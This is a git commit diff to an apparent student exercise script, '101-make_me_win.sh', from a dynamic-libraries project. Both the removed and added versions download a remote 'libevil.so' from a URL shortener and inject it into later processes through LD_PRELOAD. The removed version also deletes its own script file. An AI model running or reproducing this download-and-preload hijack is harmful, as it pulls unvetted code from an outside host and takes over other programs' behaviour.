e0afb2f24615110d882a706013821bdddaa73d7c
patrickdeyoreo <pdeyoreo@gmail.com>
2019-09-17 06:35:09 -0700

    Trying a solution with wget and no removal

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
-LD_PRELOAD="$(mktemp -d)/libevil.so${LD_PRELOAD:+:${LD_PRELOAD}}"
-tar -C "${LD_PRELOAD%%/libevil*}" -xzf <(curl -sL https://tinyurl.com/1i83vi1)
-export LD_PRELOAD $(rm -f "${BASH_SOURCE[0]}" &>/dev/null)
+#!/bin/bash
+export LD_PRELOAD="$(mktemp -d)/libevil.so${LD_PRELOAD:+:${LD_PRELOAD}}"
+LD_PRELOAD="" wget -q -O "${LD_PRELOAD%%:*}" 'https://tinyurl.com/cr4ckm3'
